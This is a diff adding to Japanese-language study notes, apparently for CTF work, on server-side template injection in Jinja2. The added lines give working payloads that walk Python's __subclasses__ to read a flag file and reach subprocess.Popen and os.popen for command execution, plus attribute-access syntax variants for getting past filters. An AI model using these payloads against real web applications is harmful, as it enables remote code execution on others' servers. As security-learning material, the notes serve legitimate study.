@@ -75,6 +75,19 @@ https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md
 以下のtplmapよりも多くのほぼすべてのテンプレートエンジンの環境があって、しかも`exploit.py`もついてる！！神！！   
 ### jinja2
 (見やすくするために出力結果には適宜改行を入れてる。)   
+結局、Python2なら`<type 'file'>`を使った以下  
+```txt
+''.__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read()
+```
+python3ならこの`__subclasses__`経由ではfileは存在しないが、`<class 'warnings.catch_warnings'>`,`<class 'subprocess.Popen'>`を使って以下のようにしてRCE!  
+```txt
+<class 'subprocess.Popen'>
+{{ ''.__class__.__mro__[1].__subclasses__()[1439](["touch /tmp/test2"] , shell=True) }}
+
+<class 'warnings.catch_warnings'>
+{{ ''.__class__.__mro__[1].__subclasses__()[870]['__repr__']['__globals__']['sys']['modules']['os'].popen('echo AA').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[870]['__repr__']['__globals__'].get("__builtins__").get("__import__")("subprocess").check_output("echo AA" , shell=True) }}
+```
 #### config
 - `{{config}}`   
 ```txt
@@ -1286,6 +1299,11 @@ Internal Server Error
 {% set class = "__class__" %}
 
 {{string|attr(class)}}
+```
+以下でもよい  
+```txt
+{{ foo.bar }}
+{{ foo['bar'] }}
 ```
 `{{ [[]|map|string|list][0][20] }}`で`_`,`{{ [1|float|string|list][0][1] }}`で`.`を表せる。  
 ```txt
